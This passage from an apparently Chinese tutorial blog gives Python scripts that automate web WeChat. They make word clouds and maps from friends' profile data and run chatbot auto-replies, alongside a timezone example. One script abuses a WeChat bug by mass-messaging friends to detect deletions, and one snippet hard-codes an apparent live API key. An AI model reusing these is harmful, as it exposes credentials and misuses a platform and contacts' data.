# 开始画图</span><br><span class="line">	plt.imshow(wc.recolor(color_func=bg_color))</span><br><span class="line">	# 为云图去掉坐标轴</span><br><span class="line">	plt.axis(<span class="string">"off"</span>)</span><br><span class="line">	# 画云图，显示</span><br><span class="line">	# 保存云图</span><br><span class="line">	wc.to_file(r<span class="string">"image/render_0%d.png"</span>%i)</span><br><span class="line"># 微信昵称</span><br><span class="line">nick_name = <span class="string">''</span></span><br><span class="line"># 微信个性签名</span><br><span class="line">wx_signature = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> friend <span class="keyword">in</span> my_friends:</span><br><span class="line">	# 微信昵称：NickName</span><br><span class="line">	nick_name = nick_name + friend.raw[<span class="string">'NickName'</span>]</span><br><span class="line">	# 个性签名：Signature</span><br><span class="line">	wx_signature = wx_signature + friend.raw[<span class="string">'Signature'</span>]</span><br><span class="line"></span><br><span class="line">nick_name = jiebaclearText(nick_name)</span><br><span class="line">wx_signature = jiebaclearText(wx_signature)</span><br><span class="line">make_wordcloud(nick_name,<span class="number">1</span>)</span><br><span class="line">make_wordcloud(wx_signature,<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<h3 id="检测微信好友是否把你删除"><a href="#检测微信好友是否把你删除" class="headerlink" title="检测微信好友是否把你删除"></a>检测微信好友是否把你删除</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">通过Pyhton登录网页版微信，给你所有好友发送 జ్ఞా 这个特殊符号，由于微信的bug，对方收不到这个特殊符号，只要有人删了你，你的微信对话页面就会显示对方已经把你删除发送失败。</span><br><span class="line">pip install itchat</span><br><span class="line"><span class="keyword">import</span> itchat</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">itchat.auto_login(hotReload=True) # 热加载</span><br><span class="line">  </span><br><span class="line">print(<span class="string">'检测结果可能会引起不适。'</span>)</span><br><span class="line">print(<span class="string">'检测结果请在手机上查看，此处仅显示检测信息。'</span>)</span><br><span class="line">print(<span class="string">'消息被拒收为被拉黑， 需要发送验证信息为被删。'</span>)</span><br><span class="line">print(<span class="string">'没有结果就是好结果。'</span>)</span><br><span class="line">print(<span class="string">'检测1000位好友需要34分钟， 以此类推。'</span>)</span><br><span class="line">print(<span class="string">'为了你的账号安全着想，这个速度刚好。'</span>)</span><br><span class="line">print(<span class="string">'在程序运行期间请让程序保持运行，网络保持连接。'</span>)</span><br><span class="line">print(<span class="string">'请不要从手机端手动退出。'</span>)</span><br><span class="line">input(<span class="string">'按ENTER键继续...'</span>)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">friends = itchat.get_friends(update=True)</span><br><span class="line">lenght = len(friends)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, lenght):</span><br><span class="line">    # 微信bug，用自己账户给所有好友发送"ॣ ॣ ॣ"消息，当添加自己为好友时，只有自己能收到此信息，如果没添加自己为好友\</span><br><span class="line">    # 没有人能收到此信息，笔者此刻日期为2019/1/6 8:30，到目前为止微信bug还没修复。</span><br><span class="line">    # 所以迭代从除去自己后的第二位好友开始 range(1, lenght)。</span><br><span class="line">    itchat.send(<span class="string">"జ్ఞా"</span>, toUserName=friends[i][<span class="string">'UserName'</span>])</span><br><span class="line">    print(f<span class="string">'检测到第&#123;i&#125;位好友: &#123;str(friends[i]["NickName"]).center(20, " ")&#125;'</span>)</span><br><span class="line">    # 发送信息速度过快会被微信检测到异常行为。https://www.qingwei.tech/programe-develops/python/1268.html</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">  </span><br><span class="line">print(<span class="string">'已检测完毕，请在手机端查看结果。'</span>)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">itchat.run()</span><br></pre></td></tr></table></figure>
<h3 id="分析你的微信好友签名"><a href="#分析你的微信好友签名" class="headerlink" title="分析你的微信好友签名"></a>分析你的微信好友签名</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itchat</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud, ImageColorGenerator</span><br><span class="line">from scipy.misc import imread  # 这是一个处理图像的函数https://juejin.im/post/5ca4c7d7f265da30d34ba228</span><br><span class="line"></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">#导入模块</span><br><span class="line"><span class="keyword">from</span> wxpy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">微信机器人登录有3种模式，</span></span><br><span class="line"><span class="string">(1)极简模式:robot = Bot()</span></span><br><span class="line"><span class="string">(2)终端模式:robot = Bot(console_qr=True)</span></span><br><span class="line"><span class="string">(3)缓存模式(可保持登录状态):robot = Bot(cache_path=True)</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line">#初始化机器人，选择缓存模式（扫码）登录</span><br><span class="line">robot = Bot(cache_path=True)</span><br><span class="line"></span><br><span class="line">#获取好友、群、公众号信息</span><br><span class="line">robot.chats()</span><br><span class="line"></span><br><span class="line">#获取好友的统计信息</span><br><span class="line">Friends = robot.friends()</span><br><span class="line">print(Friends.stats_text())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sign_list=[]</span><br><span class="line">itchat.auto_login(hotReload=True)</span><br><span class="line">itchat.send(u<span class="string">'Hello,world'</span>,<span class="string">'filehelper'</span>)</span><br><span class="line">friends = itchat.get_friends(update=True)[<span class="number">0</span>:]</span><br><span class="line">print(<span class="string">'开始获取微信好友个性签名.....'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> friends:</span><br><span class="line">    signature = i["Signature"].strip().replace("span", "").replace("class", "").replace("emoji", "") #过滤掉表情</span><br><span class="line">    #rep = re.compile("&lt; =.+/&gt;")</span><br><span class="line">    rep = re.compile(<span class="string">"[^\u4e00-\u9fa5^]"</span>)</span><br><span class="line">    nickName=i[<span class="string">"NickName"</span>]</span><br><span class="line">    signature = rep.sub(<span class="string">""</span>, signature)</span><br><span class="line">    sign_list.append(signature)</span><br><span class="line"></span><br><span class="line">text=<span class="string">''</span>.join(sign_list)</span><br><span class="line">wordlist_jieba = jieba.cut(text, cut_all=True)</span><br><span class="line">wl_space_split = <span class="string">' '</span>.join(wordlist_jieba)</span><br><span class="line"></span><br><span class="line">back_color = imread(<span class="string">'./mao.jpg'</span>)</span><br><span class="line"></span><br><span class="line"># 词云</span><br><span class="line">my_wordcloud = WordCloud(</span><br><span class="line">    background_color='white',  # 背景颜色</span><br><span class="line">    max_words=2000,  # 最大词数</span><br><span class="line">    mask=back_color,  # 以该参数值作图绘制词云，这个参数不为空时，width和height会被忽略</span><br><span class="line">    max_font_size=100,  # 显示字体的最大值</span><br><span class="line">    font_path='C:/Windows/Fonts/simfang.ttf',  # 指定字体文件 解决显示口字型乱码问题，</span><br><span class="line">    random_state=42,  # 为每个词返回一个PIL颜色</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"># 用wl_space_split生成词云</span><br><span class="line">my_wordcloud.generate(wl_space_split)</span><br><span class="line"></span><br><span class="line"># 基于彩色图像 生成响应的色彩</span><br><span class="line">image_colors = ImageColorGenerator(back_color)</span><br><span class="line"># 显示图片</span><br><span class="line"># plt.imshow(my_wordcloud)</span><br><span class="line"># 关闭坐标轴</span><br><span class="line"># plt.axis('off')</span><br><span class="line"># 绘制词云</span><br><span class="line">plt.figure()</span><br><span class="line">plt.imshow(my_wordcloud.recolor(color_func=image_colors))</span><br><span class="line">plt.axis(<span class="string">'off'</span>)</span><br><span class="line"># 保存图片</span><br><span class="line">my_wordcloud.to_file(<span class="string">'ciyun.png'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="处理-Python-中的时区"><a href="#处理-Python-中的时区" class="headerlink" title="处理 Python 中的时区"></a>处理 Python 中的时区</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pip install pytz</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">from</span> pytz <span class="keyword">import</span> timezone</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">import</span> pytz</span><br><span class="line">&gt;&gt;&gt; utc = pytz.utc</span><br><span class="line">&gt;&gt;&gt; utc.zone</span><br><span class="line"><span class="string">'UTC'</span></span><br><span class="line">&gt;&gt;&gt; beijing = timezone(<span class="string">'Asia/Shanghai'</span>)</span><br><span class="line">&gt;&gt;&gt; beijing.zone</span><br><span class="line"><span class="string">'Asia/Shanghai'</span></span><br><span class="line">&gt;&gt;&gt; tokyo = timezone(<span class="string">'Asia/Tokyo'</span>)</span><br><span class="line">&gt;&gt;&gt; tokyo.zone</span><br><span class="line"><span class="string">'Asia/Tokyo'</span></span><br><span class="line">第一种是使用pytz库提供的 localize() 方法。这用于本地化一个没有时区信息的日期时间:</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; fmt = <span class="string">'%Y-%m-%d %H:%M:%S %Z%z'</span></span><br><span class="line">&gt;&gt;&gt; loc_dt = beijing.localize(datetime(<span class="number">2018</span>, <span class="number">10</span>, <span class="number">27</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&gt;&gt;&gt; print(loc_dt.strftime(fmt))</span><br><span class="line"><span class="string">'2018-10-27 06:00:00 CST+0800'</span></span><br><span class="line"></span><br><span class="line">第二种方法是使用标准 astimezone() 方法转换现有的本地化时间：</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; jp_dt = loc_dt.astimezone(tokyo)</span><br><span class="line">&gt;&gt;&gt; jp_dt.strftime(fmt)</span><br><span class="line"><span class="string">'2018-10-27 07:00:00 JST+0900'</span></span><br><span class="line">处理时间的首选方法是始终以UTC工作，仅在生成输出以供人类读取时转换为本地时间:</span><br><span class="line">&gt;&gt;&gt; utc_dt = datetime(<span class="number">2018</span>, <span class="number">10</span>, <span class="number">27</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, tzinfo=utc)</span><br><span class="line">&gt;&gt;&gt; loc_dt = utc_dt.astimezone(beijing)</span><br><span class="line">&gt;&gt;&gt; loc_dt.strftime(fmt)</span><br><span class="line"><span class="string">'2018-10-27 14:00:00 CST+0800'</span></span><br><span class="line">此库还允许使用本地时间进行日期算术，例如计算北京和东京的时差：</span><br><span class="line">&gt;&gt;&gt; timestamp = datetime.utcnow()</span><br><span class="line">&gt;&gt;&gt; dt_cn = beijing.localize(timestamp)</span><br><span class="line">&gt;&gt;&gt; dt_jp =tokyo.localize(timestamp)</span><br><span class="line">&gt;&gt;&gt; x = dt_cn - dt_jp</span><br><span class="line">&gt;&gt;&gt; int(x.total_seconds()/<span class="number">3600</span>)</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<h3 id="Python生成微信好友位置分布图"><a href="#Python生成微信好友位置分布图" class="headerlink" title="Python生成微信好友位置分布图"></a>Python生成微信好友位置分布图</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itchat</span><br><span class="line"><span class="keyword">from</span> pyecharts <span class="keyword">import</span> <span class="built_in">Map</span></span><br><span class="line"></span><br><span class="line">#http://shuaiguoer.com/%E5%BE%AE%E4%BF%A1%E5%A5%BD%E5%8F%8B%E4%BD%8D%E7%BD%AE%E5%88%86%E5%B8%83%E5%9B%BE/</span><br><span class="line">List = []</span><br><span class="line">a = &#123;&#125;</span><br><span class="line">name = []</span><br><span class="line">value = []</span><br><span class="line"># 登录微信</span><br><span class="line">itchat.login()</span><br><span class="line"># 获取所有好友信息</span><br><span class="line">owner = itchat.get_friends()</span><br><span class="line"># 获取所有好友的所在位置</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> owner:</span><br><span class="line">    province = i[<span class="string">'Province'</span>]</span><br><span class="line">    List.append(province)</span><br><span class="line"># 获取每个位置对应的好友人数</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> List:</span><br><span class="line">    <span class="keyword">if</span> List.count(s) &gt;= <span class="number">1</span>:</span><br><span class="line">        a[s] = List.count(s)</span><br><span class="line"># 把去重后的位置添加到列表name中</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">    name.append(j)</span><br><span class="line"># 把每个位置对应的好友人数添加到列表values中</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> a.values():</span><br><span class="line">    value.append(v)</span><br><span class="line"># 生成地图</span><br><span class="line">maps = Map('微信好友位置分布图', width=1500, height=900)     # 设置地图的宽和高</span><br><span class="line"># 把数据添加到地图中</span><br><span class="line">maps.add(<span class="string">''</span>, name, value, maptype=<span class="string">'china'</span>, is_visualmap=True, visual_text_color=<span class="string">'#000'</span>, is_label_show=True, visual_range=[<span class="number">0</span>, <span class="number">20</span>])</span><br><span class="line"># is_visualmap        ---&gt;    是否使用视觉映射组件</span><br><span class="line"># visual_text_color   ---&gt;    两端文本颜色</span><br><span class="line"># is_label_show       ---&gt;    是否正常显示标签。标签即各点的数据项信息</span><br><span class="line"># visual_range        ---&gt;    指定允许的最小值与最大值</span><br><span class="line">maps.render('微信好友位置分布图.html')       # 生成HTML文件</span><br></pre></td></tr></table></figure>
<h3 id="图灵机器人与指定的好友微信聊天"><a href="#图灵机器人与指定的好友微信聊天" class="headerlink" title="图灵机器人与指定的好友微信聊天"></a>图灵机器人与指定的好友微信聊天</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itchat</span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"> </span><br><span class="line"># 监听人的微信id</span><br><span class="line">touserNameId = <span class="string">'@becc4377a98a6df74fafc1192a3dd045'</span></span><br><span class="line">fromuserId=<span class="string">'d3aef9a75e2b51430683ffeb386f0564'</span></span><br><span class="line">tulingDomain=<span class="string">'openapi.tuling123.com'</span></span><br><span class="line">tulingOpenapiUrl=<span class="string">'http://'</span>+ tulingDomain + <span class="string">'/openapi/api/v2'</span></span><br><span class="line"># 聊天计数</span><br><span class="line">count= <span class="number">0</span></span><br><span class="line"> </span><br><span class="line"># 监听接收到的文件信息</span><br><span class="line">@itchat.msg_register(itchat.content.TEXT)</span><br><span class="line">def reply_msg(msg):</span><br><span class="line"> </span><br><span class="line">    print(msg)</span><br><span class="line">    # 指定好友回复特定消息</span><br><span class="line">    <span class="keyword">if</span> msg[<span class="string">'FromUserName'</span>] == touserNameId and msg[<span class="string">'ToUserName'</span>] == touserNameId:</span><br><span class="line"> </span><br><span class="line">        global count</span><br><span class="line"> </span><br><span class="line">        # 图灵机器人</span><br><span class="line">        robbot0 = <span class="string">'appkey0'</span></span><br><span class="line">        # 图灵机器人1</span><br><span class="line">        robbot1 = <span class="string">'appkey1'</span></span><br><span class="line">        # 图灵机器人2</span><br><span class="line">        robbot2 = <span class="string">'appkey2'</span></span><br><span class="line">        # 图灵机器人3</span><br><span class="line">        robbot3 = <span class="string">'appkey3'</span></span><br><span class="line">        # 图灵机器人4</span><br><span class="line">        robbot4 = <span class="string">'appkey4'</span></span><br><span class="line"> </span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        temp= <span class="string">'robbot'</span>+ str(count<span class="comment">//98)</span></span><br><span class="line">        usedRobbot =locals()[temp]</span><br><span class="line">        print(<span class="string">"收到："</span>, msg.text)</span><br><span class="line">        info = msg.text</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        headers = &#123;</span><br><span class="line">            # heard部分直接通过chrome部分request header部分</span><br><span class="line">            <span class="string">'Accept'</span>: <span class="string">'application/json, text/plain, */*'</span>,</span><br><span class="line">            <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">            <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8'</span>,</span><br><span class="line">            <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">            'Content-Length': '14',  # get方式提交的数据长度，如果是post方式，转成get方式：【id=wdb&amp;pwd=wdb】</span><br><span class="line">            <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">            <span class="string">'Referer'</span>: <span class="string">'http://10.1.2.151/'</span>,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.23 Mobile Safari/537.36'</span></span><br><span class="line">        &#125;</span><br><span class="line">        data = &#123;</span><br><span class="line">	        <span class="string">"reqType"</span>:<span class="number">0</span>,</span><br><span class="line">             <span class="string">"perception"</span>: &#123;</span><br><span class="line">                <span class="string">"inputText"</span>: &#123;</span><br><span class="line">                    <span class="string">"text"</span>: info</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"selfInfo"</span>: &#123;</span><br><span class="line">                    <span class="string">"location"</span>: &#123;</span><br><span class="line">                        <span class="string">"city"</span>: <span class="string">"北京"</span>,</span><br><span class="line">                        <span class="string">"province"</span>: <span class="string">"北京"</span>,</span><br><span class="line">                        <span class="string">"street"</span>: <span class="string">"信息路"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">             &#125;,</span><br><span class="line">            <span class="string">"userInfo"</span>: &#123;</span><br><span class="line">                <span class="string">"apiKey"</span>: usedRobbot,</span><br><span class="line">                <span class="string">"userId"</span>: <span class="string">"me"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # 这里是为了找到 id 包含 FromUserName 和 ToUserName</span><br><span class="line">        print(data)</span><br><span class="line">        conn = http.client.HTTPConnection(tulingDomain)</span><br><span class="line">        header = &#123;<span class="string">"Content-type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line">        conn.request(method=<span class="string">"POST"</span>, url=tulingOpenapiUrl, headers=header, body=json.dumps(data))</span><br><span class="line">        response = conn.getresponse()</span><br><span class="line">        # print(response.status)</span><br><span class="line">        # print(response.reason)</span><br><span class="line">        res = response.read()</span><br><span class="line">        # print(res)</span><br><span class="line">        resp = json.loads(res)</span><br><span class="line">        #print(resp)</span><br><span class="line">        #print(type(resp))</span><br><span class="line"> </span><br><span class="line">        reponseType = resp[<span class="string">'results'</span>][<span class="number">0</span>][<span class="string">'values'</span>]</span><br><span class="line">        print(reponseType)</span><br><span class="line">        print(type(reponseType))</span><br><span class="line"> </span><br><span class="line">        #str = input("回复：")</span><br><span class="line">        itchat.send(reponseType[<span class="string">'text'</span>],toUserName=touserNameId)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    # 退出程序以后还暂存登录状态 https://blog.csdn.net/yan88888888888888888/article/details/89373626</span><br><span class="line">    itchat.auto_login(hotReload=True)</span><br><span class="line"> </span><br><span class="line">    # 给文件助手发消息</span><br><span class="line">    itchat.send(<span class="string">"文件助手你好哦"</span>, toUserName=<span class="string">"filehelper"</span>)</span><br><span class="line">    itchat.run()</span><br></pre></td></tr></table></figure>
<h3 id="图灵机器人回复微信"><a href="#图灵机器人回复微信" class="headerlink" title="图灵机器人回复微信"></a>图灵机器人回复微信</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> wxpy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> wx_friend</span><br><span class="line"></span><br><span class="line"># 微信机器人，缓存登录信息</span><br><span class="line">bot = Bot(cache_path=True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@bot.register(msg_types=FRIENDS)</span><br><span class="line">def auto_reply(msg):</span><br><span class="line">    <span class="string">""</span><span class="string">"自动接受好友请求"</span><span class="string">""</span></span><br><span class="line">    wx_friend.auto_accept_friends(msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@bot.register(chats=Friend)</span><br><span class="line">def auto_reply(msg):</span><br><span class="line">    <span class="string">""</span><span class="string">"自动回复好友"</span><span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> msg.type == TEXT:</span><br><span class="line">        wx_friend.auto_reply(msg)</span><br><span class="line">    elif msg.type == RECORDING:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'不听不听，王八念经'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">embed()</span><br><span class="line"></span><br><span class="line"><span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">    免费申请图灵机器人，获取api_key</span></span><br><span class="line"><span class="string">    图灵机器人免费申请地址 http://www.tuling123.com</span></span><br><span class="line"><span class="string">"</span><span class="string">""</span></span><br><span class="line">tuling = Tuling(api_key=<span class="string">'7c8cdb56b0dc4450a8deef30a496bd4c'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def auto_reply(msg):</span><br><span class="line">    <span class="string">""</span><span class="string">"回复消息，并返回答复文本"</span><span class="string">""</span></span><br><span class="line">    <span class="keyword">return</span> tuling.do_reply(msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">        直接点击测试图灵机器人</span></span><br><span class="line"><span class="string">        